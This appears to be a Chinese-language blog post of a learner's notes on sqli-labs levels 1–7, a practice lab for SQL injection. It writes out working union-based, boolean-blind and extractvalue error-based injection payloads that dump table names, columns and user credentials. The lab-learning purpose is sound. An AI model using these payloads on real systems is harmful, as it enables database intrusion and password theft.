---
layout: post
title: sqli-labs
date: 2024-12-11 22:05:05 +0800
categories: [web]
---

#### ***less-1***
      Error based Single quotes  
        思路和ctfhub大致一样，不过有点小区别

首先输入1很正常，输入1’ --+也是
然后判断类型1 and 1=1和1 and 1=2没区别都有显示，说明不是数字型
用1’ and ‘1’=‘1这种判断发现是字符型
然后几列
1’ order by 1,2,3 --+发现有三列（比ctfhub多一列）
试试-1‘ union select 1,2,3--+  发现显示2和3
联合查询
-1‘ union select 1,version(),database()--+
     注意这里三列所以要写三个，两个是查数据库，这里三个就查数据库和<mark>**版本号version</mark>

爆表
group_concat(table_name) from information_schema.tables where table_schema='security'--+
爆列
group_concat(column_name) from information_schema.columns where table_name='users'--+
爆字段
group_concat(username ,id , password) from users--+
group_concat(username,password) from users--+
group_concat(password) from users--+
(这里分别爆的id，username，password以及只爆两个和一个的)

#### ***less-2
     Error based Intiger based
        思路和步骤和less-1一样，不详记录了

通过判断发现是数字型，其他与less-1相同

#### ***less-3
     Error based Single quotes with twist

初步判断感觉是字符型
    按之前字符查列发现不对劲，好像跟之前不太一样
输入1’得到这个报错
use near ''1'') LIMIT 0,1' at line 1
(忽略自己输入的值1‘，发现报错语句这里符号是’‘ ’）这个，按理来说语句符号应该会对称，所以可以猜测这个结构应该是‘），要带括号和单引号)
可推断sql语句是单引号字符型且有括号，所以我们需要闭合单引号且也要考虑括号。
输入1‘ ）--+
发现正常
所以应该就是加括号的结构
然后其余思路和步骤一样

#### ***less-4
     Error based Double Quotes

初步判断既不是一般数字型也不是一般字符型
试了几次，输入1“时终于报错
       单引号和双引号，输两个单引号不会报错但是输一个双引号会
use near '"1"") LIMIT 0,1' at line 1
（同理可知，这里符号是’“ ”），需要双引号和括号闭合...
好像第一个单引号是单独的，猜测可能是用--+对应，感觉字符型可能都会有这个...
换一种方式看待，要使其闭合，就直接看输入值的后面的符号，这里是1“，那么应该看后面的”），所以是双引号加括号结构）
输入1“）--+
发现正常
然后其他步骤一样

#### **less-5
    Double injection Single Quotes

初步判断是一般字符型
有3列
但是它没有什么显示，只有You are in.......
感觉应该是被拦住了或者被阻止？

###### 这里是用布尔盲注来检测
      但是说实话还是比较倾向于报错注入一点，毕竟布尔盲注只会告诉你对错...暂且这样认为的

    1‘ and length((select database()))=8--+
  大于7不大于8，得到数据库长度是8

    1'and length((select group_concat(table_name) from information_schema.tables where table_schema=database()))=29--+
  所有表名字符长度是29

    1'and ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'),1,1))=105--+
  逐一判断字段名

    1' and length((select group_concat(username,password) from users))=175--+
   判断字段内容长度
 
    1' and ascii(substr((select group_concat(username,password) from users),1,1))=68--+
  逐一检测内容

###### 可以用报错注入

     1' and (extractvalue(1,concat(0x7e,(select user()),0x7e)))--+
    1' and (extractvalue(1,concat(0x7e,(select database()),0x7e)))--+

1' union select 1,2, (<mark>extractvalue(1</mark>,concat(<mark>0x7e</mark>,(select database()),<mark>0x7e</mark>)))--+

得到~root@localhost~，~security~
(前面是用and的，后面是用联合查询那种类似的union select，都可以)

    1' and (select extractvalue(1, concat(0x7e, (select group_concat(table_name) from information_schema.tables where table_schema= 'security'))))--+

    1' union select 1,2,extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()))) --+

1' union select 1,2,extractvalue(1,concat(<mark>0x7e</mark>,(select group_concat(table_name) from information_schema.tables where table_schema='<mark>security</mark>'))) --+
都能得到~emails, ref erer s , u agent s, users和之前很像
（最后都不用带0x7e，但是前面concat这里需要，
括号要对应，extractvalue前面如果括起来那最后可能是4个反括号，如果没有那后面可能是3个反括弧）

    1' union select 1,2,extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'))) -- +

爆出'~id, username, password，和之前一样了

    1' union select 1,2,extractvalue(1,concat(0x7e,substring((select group_concat(username,password) from users),31,30))) -- +
 回显，这里又用一个substring（）函数

    1' union select 1,2,extractvalue(1,concat(0x7e,(select group_concat(username,password) from users))) -- +
这个也能回显一些，具体是不是正确的我也不知道，但是感觉应该可以得到一定username，password

    （不知道是不是错觉就是这两个回显好像都只有部分。。因为就一排，之前的password有几排来着...）

##### ***less-6
     Double injection Double Quotes

输入1和less-5一样you are in...
所以可以用报错注入这种，或者布尔注入

输入1“出现
near '"1"" LIMIT 0,1' at line 1
所以应该是双引号字符型
三列
其他大致与less-5一样
    1" union select 1,2,(extractvalue(1,concat(0x7e,(select database()),0x7e)))--+

    1" union select 1,2,(extractvalue(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema='security'))))--+

    1" union select 1,2,(extractvalue(1,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_schema=database() and table_name='users'))))--+

    1“ union select 1,2,extractvalue(1,concat(0x7e,substring((select group_concat(username,password) from users),31,30))) -- +

##### ***less-7
    Dump into Outfile

输入1
得到You are in.... Use outfile......
     比之前多了一丢丢但是无关...
输入1’
报错You have an error in your SQL syntax
     也没告诉我什么错

输入其他都没错，只有带单引号的都报错欸
所以应该是单引号字符型

试了输入1‘))单引号加双括号发现不报错了，
所以应该是单引号加双括号，验证一下确实

查得3列
然后思路和前面一样，但是做法好像不是...（泪目
